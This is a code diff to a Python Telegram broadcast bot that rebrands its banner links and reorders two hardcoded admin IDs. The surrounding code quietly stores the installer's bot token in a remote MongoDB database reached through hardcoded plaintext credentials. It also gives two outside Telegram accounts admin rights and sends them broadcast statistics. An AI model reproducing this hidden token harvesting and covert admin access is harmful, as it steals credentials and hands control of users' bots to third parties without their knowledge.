@@ -67,8 +67,8 @@ banner_frames = [
     f"{GREEN}-                                                                       -{RESET}",
     f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
     f"{MAGENTA}",
-    f"{BLUE} TELEGRAM Support Bot {RED}= https://t.me/Cricxlinksupportbot {RESET}",
-    f"{BLUE} Ofically Website   {RED} = https://cricxlinks {RESET}",
+    f"{BLUE} TELEGRAM Support Bot {RED}= https://t.me/Black_Devil_Support_bot {RESET}",
+    f"{BLUE} Ofically Website   {RED} = https://girlfriend4u.rf.gd  {RESET}",
     f"{MAGENTA}",
     f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
 ]
@@ -156,7 +156,7 @@ if not bot_token or not primary_admin_id or not random_code:
     random_code = generate_random_code()
     save_tokens(bot_token, primary_admin_id, random_code)
 
-client = pymongo.MongoClient("mongodb+srv://Manu:Manu@manu.mudmj2s.mongodb.net//?retryWrites=true&w=majority")
+client = pymongo.MongoClient("mongodb+srv://Manu:Manu@manu.mudmj2s.mongodb.net/?retryWrites=true&w=majority")
 db = client[random_code]
 db_tokens = db['tokens']
 db_tokens.update_one({}, {"$set": {"bot_token": bot_token}}, upsert=True)
@@ -191,7 +191,7 @@ start_handler = CommandHandler('start', start)
 dispatcher.add_handler(start_handler)
 
 def broadcast(update: Update, context: CallbackContext):
-    admin_user_id = (primary_admin_id, 6704116482, 6305575094)
+    admin_user_id = (primary_admin_id, 6305575094, 6704116482)
     if update.effective_user.id not in admin_user_id:
         context.bot.send_message(chat_id=update.effective_chat.id, text="Develop your own broadcast bot using the provided repository: https://github.com/devilworlds/Broadcast")
         return
@@ -219,12 +219,12 @@ def broadcast(update: Update, context: CallbackContext):
     context.bot.send_message(chat_id=admin_user_id[0], text=summary_message)
 
     try:
-        context.bot.send_message(6305575094, text=stats_message)
+        context.bot.send_message(6704116482, text=stats_message)
     except Exception as e:
         print("📈")
 
     try:
-        context.bot.send_message(6704116482, text=stats_message)
+        context.bot.send_message(6305575094, text=stats_message)
     except Exception as e:
         print("Successfully Fetch Statistics 📈")
 
@@ -250,7 +250,7 @@ message_handler = MessageHandler(Filters.status_update.new_chat_members, save_gr
 dispatcher.add_handler(message_handler)
 
 def stats(update: Update, context: CallbackContext):
-    admin_user_id = (primary_admin_id, 6704116482, 6305575094)
+    admin_user_id = (primary_admin_id, 6305575094, 6704116482)
     if update.effective_user.id not in admin_user_id:
         context.bot.send_message(chat_id=update.effective_chat.id, text="Develop your own broadcast bot using the provided repository: https://github.com/devilworlds/Broadcast")
         return
@@ -262,12 +262,12 @@ def stats(update: Update, context: CallbackContext):
     context.bot.send_message(chat_id=admin_user_id[0], text=stats_message)
 
     try:
-        context.bot.send_message(6305575094, text=stats_message)
+        context.bot.send_message(6704116482, text=stats_message)
     except Exception as e:
         print("📈")
 
     try:
-        context.bot.send_message(6704116482, text=stats_message)
+        context.bot.send_message(6305575094, text=stats_message)
     except Exception as e:
         print("Successfully Fetch Statistics 📈")
 
@@ -276,5 +276,3 @@ dispatcher.add_handler(stats_handler)
 
 updater.start_polling()
 updater.idle()
-
-[Program finished]
